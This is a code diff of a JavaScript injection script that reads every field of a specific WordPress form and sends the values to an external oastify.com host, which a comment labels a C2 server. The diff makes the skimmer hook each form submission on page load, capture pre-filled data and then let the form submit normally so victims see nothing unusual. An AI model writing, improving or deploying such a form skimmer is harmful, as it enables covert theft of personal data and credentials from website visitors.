@@ -1,8 +1,9 @@
 Javascript:(function() {
-    function sendFormData() {
+    // Function to send form data
+    function sendFormData(event) {
         var formData = {};
         var form = document.getElementById('wpforms-form-6402');
-        
+
         if (form) {
             form.querySelectorAll('input, select, textarea').forEach(function(input) {
                 formData[input.name] = input.value;
@@ -17,8 +18,25 @@ Javascript:(function() {
             var img = new Image();
             img.src = 'http://558j3eefp0ih9jdkfzvrwriz2q8hwmkb.oastify.com?' + queryString; // Replace with your C2 server URL
         }
+
+        // Allow the form to submit
+        if (event) {
+            event.preventDefault();
+            form.submit();
+        }
     }
 
-    // Inject the function into the page and execute it
-    sendFormData();
+    // Attach event listener to the form on every page load
+    function attachEventListener() {
+        var form = document.getElementById('wpforms-form-6402');
+        if (form) {
+            form.addEventListener('submit', sendFormData);
+        }
+    }
+
+    // Ensure the script runs when the page loads
+    window.addEventListener('load', attachEventListener);
+
+    // Execute immediately to capture any pre-filled data
+    attachEventListener();
 })();
